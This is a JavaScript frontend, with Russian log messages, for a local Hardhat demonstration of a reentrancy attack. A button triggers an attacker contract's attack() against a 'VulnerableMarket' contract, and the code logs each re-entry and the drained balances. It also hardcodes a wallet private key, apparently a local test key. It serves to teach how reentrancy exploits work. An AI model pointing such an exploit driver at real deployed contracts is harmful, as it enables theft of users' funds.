const config = window.DEMO_CONFIG ?? {};
const TARGET_MARKET = config.targetMarket ?? "0x0000000000000000000000000000000000000000";
const ATTACKER_CONTRACT = config.attackerContract ?? "0x0000000000000000000000000000000000000000";
const RPC_URL = config.rpcUrl ?? "http://127.0.0.1:8545";
const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";

const provider = new ethers.JsonRpcProvider(RPC_URL, undefined, { cacheTimeout: 0 });
const hackerWallet = new ethers.Wallet(
    "0x8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba",
    provider
);

const abi = [
    "function attack() external payable",
    "event AttackStarted(address indexed target, uint256 amount)",
    "event Reentered(uint256 indexed count, uint256 targetBalance)",
    "event DepositRecorded(address indexed account, uint256 amount, uint256 newBalance)",
    "event WithdrawalStarted(address indexed account, uint256 amount)",
    "event ExternalCallBeforeStateUpdate(address indexed account, uint256 amount)",
    "event BalanceCleared(address indexed account)"
];

const attackerContract = new ethers.Contract(ATTACKER_CONTRACT, abi, hackerWallet);
const attackInterface = new ethers.Interface(abi);

const logsDiv = document.getElementById("logs");
const attackerAddress = document.getElementById("attackerAddress");
const targetBalance = document.getElementById("targetBalance");
const nodeStatus = document.getElementById("nodeStatus");
const hackBtn = document.getElementById("hackBtn");

function getTimestamp() {
    return new Date().toLocaleTimeString("ru-RU", { hour12: false });
}

function formatEth(value) {
    return `${Number(ethers.formatEther(value)).toFixed(4)} ETH`;
}

function short(value) {
    return `${value.slice(0, 10)}...${value.slice(-6)}`;
}

function addLog(message, type = "system") {
    const line = document.createElement("p");
    line.className = `log-line log-${type}`;
    line.textContent = `[${getTimestamp()}] ${message}`;
    logsDiv.appendChild(line);
    logsDiv.scrollTop = logsDiv.scrollHeight;
}

async function readTargetBalance() {
    return provider.getBalance(TARGET_MARKET);
}

async function updateUI() {
    attackerAddress.textContent = `${hackerWallet.address.slice(0, 8)}...${hackerWallet.address.slice(-4)}`;

    try {
        await provider.getBlockNumber();
        nodeStatus.textContent = "online";

        if (TARGET_MARKET === ZERO_ADDRESS || ATTACKER_CONTRACT === ZERO_ADDRESS) {
            targetBalance.textContent = "0.0000";
            return 0n;
        }

        const balance = await readTargetBalance();
        targetBalance.textContent = Number(ethers.formatEther(balance)).toFixed(4);
        return balance;
    } catch (error) {
        nodeStatus.textContent = "offline";
        addLog("Не удалось прочитать баланс цели. Запусти npm start и обнови страницу.", "error");
        console.error(error);
        return 0n;
    }
}

async function logReceipt(receipt) {
    const block = await provider.getBlock(receipt.blockNumber);
    addLog(`Транзакция атаки попала в блок #${receipt.blockNumber}.`, "success");
    addLog(`Block hash: ${short(block.hash)}; tx index: ${receipt.index}; gas: ${receipt.gasUsed.toString()}.`, "muted");

    for (const rawLog of receipt.logs) {
        try {
            const parsed = attackInterface.parseLog(rawLog);

            if (parsed.name === "AttackStarted") {
                addLog(`AttackStarted: атакующий внес ${formatEth(parsed.args.amount)} в цель ${short(parsed.args.target)}.`, "warning");
            }
            if (parsed.name === "DepositRecorded") {
                addLog(`VulnerableMarket записал депозит атакующего: ${formatEth(parsed.args.amount)}.`, "warning");
            }
            if (parsed.name === "WithdrawalStarted") {
                addLog(`WithdrawalStarted: цель начала вывод ${formatEth(parsed.args.amount)} для ${short(parsed.args.account)}.`, "error");
            }
            if (parsed.name === "ExternalCallBeforeStateUpdate") {
                addLog("Уязвимость: ETH отправляется до обнуления баланса.", "error");
            }
            if (parsed.name === "Reentered") {
                addLog(`Reentered #${parsed.args.count}: fallback снова вызвал withdraw(), в цели было ${formatEth(parsed.args.targetBalance)}.`, "error");
            }
            if (parsed.name === "BalanceCleared") {
                addLog(`BalanceCleared: баланс ${short(parsed.args.account)} обнулен слишком поздно.`, "muted");
            }
        } catch {
            // Skip logs that are not part of this demo ABI.
        }
    }
}

async function executeHack() {
    hackBtn.disabled = true;

    try {
        addLog("--------------------------------------------------", "muted");

        if (TARGET_MARKET === ZERO_ADDRESS || ATTACKER_CONTRACT === ZERO_ADDRESS) {
            addLog("Адреса стенда атаки не настроены. Запусти npm start и обнови страницу.", "error");
            return;
        }

        const beforeTarget = await readTargetBalance();
        const beforeAttacker = await provider.getBalance(ATTACKER_CONTRACT);
        const beforeBlock = await provider.getBlockNumber();
        addLog(`До атаки: цель ${formatEth(beforeTarget)}, контракт атакующего ${formatEth(beforeAttacker)}, блок #${beforeBlock}.`, "system");
        addLog(`Формируем Attacker.attack(value=1 ETH): from ${short(hackerWallet.address)} -> attacker ${short(ATTACKER_CONTRACT)}.`, "system");

        const tx = await attackerContract.attack({ value: ethers.parseEther("1") });
        addLog(`RPC принял транзакцию. Hash: ${tx.hash}.`, "warning");
        addLog("Ждем блок: вся reentrancy-цепочка выполнится внутри одной транзакции.", "system");

        const receipt = await tx.wait();
        await logReceipt(receipt);

        const afterTarget = await readTargetBalance();
        const afterAttacker = await provider.getBalance(ATTACKER_CONTRACT);
        addLog(`После атаки: цель ${formatEth(afterTarget)}, контракт атакующего ${formatEth(afterAttacker)}.`, "success");
        await updateUI();
    } catch (error) {
        addLog(`Exploit не выполнен: ${error.shortMessage || error.message}`, "error");
        console.error(error);
    } finally {
        hackBtn.disabled = false;
    }
}

hackBtn.addEventListener("click", executeHack);

addLog(`Подключение к Hardhat RPC: ${RPC_URL}.`, "system");
addLog(`Цель атаки: ${TARGET_MARKET}. Контракт атакующего: ${ATTACKER_CONTRACT}.`, "muted");
addLog("Журнал покажет: tx -> блок -> события VulnerableMarket -> re-entry.", "muted");
updateUI();
setInterval(updateUI, 3000);
